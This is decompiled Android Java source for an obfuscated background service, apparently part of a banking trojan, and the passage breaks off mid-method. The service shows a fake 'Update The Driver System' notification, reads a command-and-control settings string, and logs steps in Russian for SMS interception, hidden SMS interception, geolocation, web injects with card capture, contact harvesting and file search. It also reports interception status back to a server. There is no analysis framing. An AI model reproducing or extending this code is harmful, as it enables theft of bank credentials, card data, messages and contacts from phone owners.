package wocwvy.czyxoxmbauu.slsa;

import android.annotation.TargetApi;
import android.app.IntentService;
import android.app.Notification;
import android.app.Notification.Builder;
import android.content.Context;

public class jtfxlnc extends IntentService {

    /* renamed from: a */
    C0039c f419a = new C0039c();

    /* renamed from: b */
    C0034b f420b = new C0034b();

    /* renamed from: c */
    C0033a f421c = new C0033a();

    /* renamed from: d */
    String f422d = jtfxlnc.class.getSimpleName();

    /* renamed from: e */
    Context f423e;

    /* renamed from: f */
    private Notification f424f;

    /* renamed from: g */
    private final String f425g = "jtfxlnc";

    public jtfxlnc() {
        super("");
    }

    @TargetApi(16)
    /* renamed from: a */
    private void m294a() {
        this.f424f = new Builder(this.f423e).setContentTitle("Info").setContentText("Update The Driver System..").setSmallIcon(R.drawable.im).build();
        startForeground(9906, this.f424f);
    }

    /* renamed from: b */
    private void m295b() {
        new Thread(new Runnable() {
            /* JADX WARNING: Removed duplicated region for block: B:102:0x0438  */
            /* JADX WARNING: Removed duplicated region for block: B:103:0x043b  */
            /* JADX WARNING: Removed duplicated region for block: B:106:0x0491  */
            /* JADX WARNING: Removed duplicated region for block: B:115:0x04e0  */
            /* JADX WARNING: Removed duplicated region for block: B:116:0x04e3  */
            /* JADX WARNING: Removed duplicated region for block: B:119:0x0539  */
            /* JADX WARNING: Removed duplicated region for block: B:126:0x055e  */
            /* JADX WARNING: Removed duplicated region for block: B:142:0x05e8  */
            /* JADX WARNING: Removed duplicated region for block: B:156:0x068a  */
            /* JADX WARNING: Removed duplicated region for block: B:170:0x0723  */
            /* JADX WARNING: Removed duplicated region for block: B:173:0x073e  */
            /* JADX WARNING: Removed duplicated region for block: B:199:0x0838  */
            /* JADX WARNING: Removed duplicated region for block: B:40:0x024b A[SYNTHETIC, Splitter:B:40:0x024b] */
            /* JADX WARNING: Removed duplicated region for block: B:49:0x0295  */
            /* JADX WARNING: Removed duplicated region for block: B:58:0x02d2 A[SYNTHETIC, Splitter:B:58:0x02d2] */
            /* JADX WARNING: Removed duplicated region for block: B:65:0x0308 A[SYNTHETIC, Splitter:B:65:0x0308] */
            /* JADX WARNING: Removed duplicated region for block: B:79:0x0368  */
            /* JADX WARNING: Removed duplicated region for block: B:82:0x0372  */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public void run() {
                /*
                    r31 = this;
                    r1 = r31
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x087e }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b     // Catch:{ Exception -> 0x087e }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x087e }
                    android.content.Context r3 = r3.f423e     // Catch:{ Exception -> 0x087e }
                    java.lang.String r4 = "time_work"
                    java.lang.String r2 = r2.mo234e(r3, r4)     // Catch:{ Exception -> 0x087e }
                    int r2 = java.lang.Integer.parseInt(r2)     // Catch:{ Exception -> 0x087e }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r4 = r4.f423e
                    java.lang.String r4 = "keyguard"
                    java.lang.Object r3 = r3.getSystemService(r4)
                    android.app.KeyguardManager r3 = (android.app.KeyguardManager) r3
                    boolean r3 = r3.inKeyguardRestrictedInputMode()
                    r4 = 1000(0x3e8, double:4.94E-321)
                    java.util.concurrent.TimeUnit r6 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x002e }
                    r6.sleep(r4)     // Catch:{ InterruptedException -> 0x002e }
                    goto L_0x0033
                L_0x002e:
                    r0 = move-exception
                    r6 = r0
                    r6.printStackTrace()
                L_0x0033:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    java.lang.String r8 = "SettingsAll"
                    java.lang.String r6 = r6.mo234e(r7, r8)
                    java.lang.String r7 = ""
                    boolean r7 = r6.equals(r7)
                    if (r7 != 0) goto L_0x087e
                    java.lang.String r7 = "~"
                    java.lang.String[] r6 = r6.split(r7)
                    r7 = 15000(0x3a98, float:2.102E-41)
                    r8 = 1
                    r9 = r6[r8]     // Catch:{ Exception -> 0x005a }
                    int r9 = java.lang.Integer.parseInt(r9)     // Catch:{ Exception -> 0x005a }
                    r7 = r9
                    goto L_0x0065
                L_0x005a:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r9 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r9 = r9.f420b
                    java.lang.String r10 = "ERROR"
                    java.lang.String r11 = "INTERVAL GO"
                    r9.mo213a(r10, r11)
                L_0x0065:
                    r9 = 2
                    r9 = r6[r9]
                    r10 = 3
                    r11 = r6[r10]
                    r12 = 4
                    r12 = r6[r12]
                    r13 = 5
                    r13 = r6[r13]
                    int r13 = java.lang.Integer.parseInt(r13)
                    r14 = 6
                    r15 = r6[r14]
                    int r15 = java.lang.Integer.parseInt(r15)
                    r16 = 7
                    r14 = r6[r16]
                    java.lang.String r10 = "/"
                    java.lang.String[] r10 = r14.split(r10)
                    r10 = r10[r8]
                    int r10 = java.lang.Integer.parseInt(r10)
                    r14 = r6[r16]
                    java.lang.String r4 = "/"
                    java.lang.String[] r4 = r14.split(r4)
                    r5 = 0
                    r4 = r4[r5]
                    r14 = 8
                    r5 = r6[r14]
                    java.lang.String r14 = "/"
                    java.lang.String[] r5 = r5.split(r14)
                    r5 = r5[r8]
                    int r5 = java.lang.Integer.parseInt(r5)
                    r8 = 8
                    r8 = r6[r8]
                    java.lang.String r14 = "/"
                    java.lang.String[] r8 = r8.split(r14)
                    r14 = 0
                    r8 = r8[r14]
                    r14 = 9
                    r14 = r6[r14]
                    int r14 = java.lang.Integer.parseInt(r14)
                    r16 = 10
                    r18 = r2
                    r2 = r6[r16]
                    int r2 = java.lang.Integer.parseInt(r2)
                    r16 = 11
                    r19 = r3
                    r3 = r6[r16]
                    r16 = 12
                    r20 = r3
                    r3 = r6[r16]
                    java.lang.String r16 = ""
                    r17 = 13
                    r6 = r6[r17]     // Catch:{ Exception -> 0x00db }
                    r21 = r3
                    goto L_0x00df
                L_0x00db:
                    r21 = r3
                    r6 = r16
                L_0x00df:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    r22 = r6
                    java.lang.String r6 = "Интервал отстука"
                    r23 = r2
                    java.lang.StringBuilder r2 = new java.lang.StringBuilder
                    r2.<init>()
                    r24 = r14
                    java.lang.String r14 = ""
                    r2.append(r14)
                    r2.append(r7)
                    java.lang.String r2 = r2.toString()
                    r3.mo213a(r6, r2)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Перехват смс"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    java.lang.String r14 = ""
                    r6.append(r14)
                    r6.append(r9)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Скрытый перехват смс"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    java.lang.String r14 = ""
                    r6.append(r14)
                    r6.append(r11)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Запуск геолокации"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    java.lang.String r14 = ""
                    r6.append(r14)
                    r6.append(r12)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Запрос прав на инжекты"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    java.lang.String r14 = ""
                    r6.append(r14)
                    r6.append(r13)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Запрос прав на blkzyyyfc"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    java.lang.String r14 = ""
                    r6.append(r14)
                    r6.append(r15)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Авто инжекты + СС"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    r6.append(r4)
                    java.lang.String r14 = " | "
                    r6.append(r14)
                    r6.append(r10)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Инжи + СС"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    r6.append(r8)
                    java.lang.String r14 = " | "
                    r6.append(r14)
                    r6.append(r5)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Получить контакты"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    java.lang.String r14 = ""
                    r6.append(r14)
                    r14 = r24
                    r6.append(r14)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Запуск blkzyyyfc по тайму"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    r25 = r14
                    java.lang.String r14 = ""
                    r6.append(r14)
                    r14 = r23
                    r6.append(r14)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "Поиск файлов"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    r26 = r14
                    java.lang.String r14 = ""
                    r6.append(r14)
                    r14 = r22
                    r6.append(r14)
                    java.lang.String r6 = r6.toString()
                    r2.mo213a(r3, r6)
                    java.util.concurrent.TimeUnit r2 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x021f }
                    r27 = r5
                    r5 = 1000(0x3e8, double:4.94E-321)
                    r2.sleep(r5)     // Catch:{ InterruptedException -> 0x021d }
                    goto L_0x0226
                L_0x021d:
                    r0 = move-exception
                    goto L_0x0222
                L_0x021f:
                    r0 = move-exception
                    r27 = r5
                L_0x0222:
                    r2 = r0
                    r2.printStackTrace()
                L_0x0226:
                    java.lang.String r2 = ""
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0238 }
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b     // Catch:{ Exception -> 0x0238 }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0238 }
                    android.content.Context r5 = r5.f423e     // Catch:{ Exception -> 0x0238 }
                    java.lang.String r6 = "madeSettings"
                    java.lang.String r3 = r3.mo234e(r5, r6)     // Catch:{ Exception -> 0x0238 }
                    r2 = r3
                    goto L_0x0243
                L_0x0238:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r5 = "jtfxlnc"
                    java.lang.String r6 = "ERROR madeString"
                    r3.mo213a(r5, r6)
                L_0x0243:
                    java.lang.String r3 = "13 "
                    boolean r3 = r2.contains(r3)
                    if (r3 == 0) goto L_0x028d
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x026f }
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b     // Catch:{ Exception -> 0x026f }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x026f }
                    android.content.Context r5 = r5.f423e     // Catch:{ Exception -> 0x026f }
                    java.lang.String r6 = "findfiles"
                    java.lang.String r3 = r3.mo234e(r5, r6)     // Catch:{ Exception -> 0x026f }
                    java.lang.String r5 = "**false**"
                    boolean r3 = r3.equals(r5)     // Catch:{ Exception -> 0x026f }
                    if (r3 != 0) goto L_0x0282
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x026f }
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b     // Catch:{ Exception -> 0x026f }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x026f }
                    android.content.Context r5 = r5.f423e     // Catch:{ Exception -> 0x026f }
                    java.lang.String r6 = "findfiles"
                    r3.mo233d(r5, r6, r14)     // Catch:{ Exception -> 0x026f }
                    goto L_0x0282
                L_0x026f:
                    java.lang.String r3 = "13 "
                    java.lang.String r5 = "13+"
                    java.lang.String r2 = r2.replace(r3, r5)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r5 = "Вып настр"
                    java.lang.String r6 = "13 ERROR"
                    r3.mo213a(r5, r6)
                L_0x0282:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r5 = "Вып настр"
                    java.lang.String r6 = "13+"
                    r3.mo213a(r5, r6)
                L_0x028d:
                    java.lang.String r3 = "11 "
                    boolean r3 = r2.contains(r3)
                    if (r3 == 0) goto L_0x02ca
                    r3 = r20
                    int r5 = r3.length()
                    r6 = 3
                    if (r5 < r6) goto L_0x02ca
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x02ac }
                    wocwvy.czyxoxmbauu.slsa.b r5 = r5.f420b     // Catch:{ Exception -> 0x02ac }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x02ac }
                    android.content.Context r6 = r6.f423e     // Catch:{ Exception -> 0x02ac }
                    java.lang.String r14 = "urls"
                    r5.mo233d(r6, r14, r3)     // Catch:{ Exception -> 0x02ac }
                    goto L_0x02bf
                L_0x02ac:
                    java.lang.String r3 = "11 "
                    java.lang.String r5 = "11+"
                    java.lang.String r2 = r2.replace(r3, r5)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r5 = "Вып настр"
                    java.lang.String r6 = "11 ERROR"
                    r3.mo213a(r5, r6)
                L_0x02bf:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r5 = "Вып настр"
                    java.lang.String r6 = "11+"
                    r3.mo213a(r5, r6)
                L_0x02ca:
                    java.lang.String r3 = "12 "
                    boolean r3 = r2.contains(r3)
                    if (r3 == 0) goto L_0x0300
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x02e2 }
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b     // Catch:{ Exception -> 0x02e2 }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x02e2 }
                    android.content.Context r5 = r5.f423e     // Catch:{ Exception -> 0x02e2 }
                    java.lang.String r6 = "urlInj"
                    r14 = r21
                    r3.mo233d(r5, r6, r14)     // Catch:{ Exception -> 0x02e2 }
                    goto L_0x02f5
                L_0x02e2:
                    java.lang.String r3 = "12 "
                    java.lang.String r5 = "12+"
                    java.lang.String r2 = r2.replace(r3, r5)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r5 = "Вып настр"
                    java.lang.String r6 = "12 ERROR"
                    r3.mo213a(r5, r6)
                L_0x02f5:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r5 = "Вып настр"
                    java.lang.String r6 = "url injections 12+"
                    r3.mo213a(r5, r6)
                L_0x0300:
                    java.lang.String r3 = "1 "
                    boolean r3 = r2.contains(r3)
                    if (r3 == 0) goto L_0x0368
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x035a }
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b     // Catch:{ Exception -> 0x035a }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x035a }
                    android.content.Context r5 = r5.f423e     // Catch:{ Exception -> 0x035a }
                    java.lang.String r6 = "interval"
                    java.lang.StringBuilder r14 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x035a }
                    r14.<init>()     // Catch:{ Exception -> 0x035a }
                    r28 = r8
                    java.lang.String r8 = ""
                    r14.append(r8)     // Catch:{ Exception -> 0x035c }
                    r14.append(r7)     // Catch:{ Exception -> 0x035c }
                    java.lang.String r8 = r14.toString()     // Catch:{ Exception -> 0x035c }
                    r3.mo233d(r5, r6, r8)     // Catch:{ Exception -> 0x035c }
                    java.lang.String r3 = "1 "
                    java.lang.String r5 = "1+"
                    java.lang.String r3 = r2.replace(r3, r5)     // Catch:{ Exception -> 0x035c }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0358 }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b     // Catch:{ Exception -> 0x0358 }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0358 }
                    android.content.Context r2 = r2.f423e     // Catch:{ Exception -> 0x0358 }
                    java.lang.String r5 = "startAlarm"
                    wocwvy.czyxoxmbauu.slsa.C0034b.m235f(r2, r5)     // Catch:{ Exception -> 0x0358 }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0358 }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b     // Catch:{ Exception -> 0x0358 }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0358 }
                    android.content.Context r2 = r2.f423e     // Catch:{ Exception -> 0x0358 }
                    java.lang.String r5 = "startAlarm"
                    long r6 = (long) r7     // Catch:{ Exception -> 0x0358 }
                    wocwvy.czyxoxmbauu.slsa.C0034b.m231a(r2, r5, r6)     // Catch:{ Exception -> 0x0358 }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0358 }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b     // Catch:{ Exception -> 0x0358 }
                    java.lang.String r5 = "Вып настр"
                    java.lang.String r6 = "Интервал сохранен"
                    r2.mo213a(r5, r6)     // Catch:{ Exception -> 0x0358 }
                    r2 = r3
                    goto L_0x036a
                L_0x0358:
                    r2 = r3
                    goto L_0x035c
                L_0x035a:
                    r28 = r8
                L_0x035c:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r5 = "Вып настр"
                    java.lang.String r6 = "1 ERROR"
                    r3.mo213a(r5, r6)
                    goto L_0x036a
                L_0x0368:
                    r28 = r8
                L_0x036a:
                    java.lang.String r3 = "2 "
                    boolean r3 = r2.contains(r3)
                    if (r3 == 0) goto L_0x0401
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r5 = r5.f423e
                    java.lang.String r6 = "perehvat_sws"
                    java.lang.String r3 = r3.mo234e(r5, r6)
                    java.lang.String r5 = "true"
                    boolean r3 = r3.contains(r5)
                    if (r3 != 0) goto L_0x0401
                    java.lang.String r3 = "true"
                    boolean r3 = r9.contains(r3)
                    if (r3 == 0) goto L_0x0393
                    java.lang.String r3 = "1"
                    goto L_0x0395
                L_0x0393:
                    java.lang.String r3 = "0"
                L_0x0395:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r5 = r5.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r6 = r6.f423e
                    java.lang.String r7 = "7"
                    java.lang.StringBuilder r8 = new java.lang.StringBuilder
                    r8.<init>()
                    java.lang.String r9 = "p="
                    r8.append(r9)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r9 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r9 = r9.f420b
                    java.lang.StringBuilder r14 = new java.lang.StringBuilder
                    r14.<init>()
                    r29 = r4
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r4 = r4.f420b
                    r30 = r10
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r10 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r10 = r10.f423e
                    java.lang.String r4 = r4.mo247q(r10)
                    r14.append(r4)
                    java.lang.String r4 = ":InterceptionSMS:"
                    r14.append(r4)
                    r14.append(r3)
                    java.lang.String r3 = ":"
                    r14.append(r3)
                    java.lang.String r3 = r14.toString()
                    java.lang.String r3 = r9.mo225c(r3)
                    r8.append(r3)
                    java.lang.String r3 = r8.toString()
                    java.lang.String r3 = r5.mo218b(r6, r7, r3)
                    java.lang.String r4 = "2453512"
                    boolean r3 = r3.contains(r4)
                    if (r3 == 0) goto L_0x0405
                    java.lang.String r3 = "2 "
                    java.lang.String r4 = "2+"
                    java.lang.String r2 = r2.replace(r3, r4)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r4 = "Вып настр"
                    java.lang.String r5 = "Перехват смс"
                    r3.mo213a(r4, r5)
                    goto L_0x0405
                L_0x0401:
                    r29 = r4
                    r30 = r10
                L_0x0405:
                    java.util.concurrent.TimeUnit r3 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x040d }
                    r4 = 1000(0x3e8, double:4.94E-321)
                    r3.sleep(r4)     // Catch:{ InterruptedException -> 0x040d }
                    goto L_0x0412
                L_0x040d:
                    r0 = move-exception
                    r3 = r0
                    r3.printStackTrace()
                L_0x0412:
                    java.lang.String r3 = "3 "
                    boolean r3 = r2.contains(r3)
                    if (r3 == 0) goto L_0x04a4
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r4 = r4.f423e
                    java.lang.String r5 = "del_sws"
                    java.lang.String r3 = r3.mo234e(r4, r5)
                    java.lang.String r4 = "true"
                    boolean r3 = r3.contains(r4)
                    if (r3 != 0) goto L_0x04a4
                    java.lang.String r3 = "true"
                    boolean r3 = r11.contains(r3)
                    if (r3 == 0) goto L_0x043b
                    java.lang.String r3 = "1"
                    goto L_0x043d
                L_0x043b:
                    java.lang.String r3 = "0"
                L_0x043d:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r4 = r4.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r5 = r5.f423e
                    java.lang.String r6 = "7"
                    java.lang.StringBuilder r7 = new java.lang.StringBuilder
                    r7.<init>()
                    java.lang.String r8 = "p="
                    r7.append(r8)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r8 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r8 = r8.f420b
                    java.lang.StringBuilder r9 = new java.lang.StringBuilder
                    r9.<init>()
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r10 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r10 = r10.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r11 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r11 = r11.f423e
                    java.lang.String r10 = r10.mo247q(r11)
                    r9.append(r10)
                    java.lang.String r10 = ":HideInterceptionSMS:"
                    r9.append(r10)
                    r9.append(r3)
                    java.lang.String r3 = ":"
                    r9.append(r3)
                    java.lang.String r3 = r9.toString()
                    java.lang.String r3 = r8.mo225c(r3)
                    r7.append(r3)
                    java.lang.String r3 = r7.toString()
                    java.lang.String r3 = r4.mo218b(r5, r6, r3)
                    java.lang.String r4 = "2453512"
                    boolean r3 = r3.contains(r4)
                    if (r3 == 0) goto L_0x04a4
                    java.lang.String r3 = "3 "
                    java.lang.String r4 = "3+"
                    java.lang.String r2 = r2.replace(r3, r4)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r4 = "Вып настр"
                    java.lang.String r5 = "Скрытый перехват смс"
                    r3.mo213a(r4, r5)
                L_0x04a4:
                    java.lang.String r3 = "4 "
                    boolean r3 = r2.contains(r3)
                    if (r3 == 0) goto L_0x054c
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
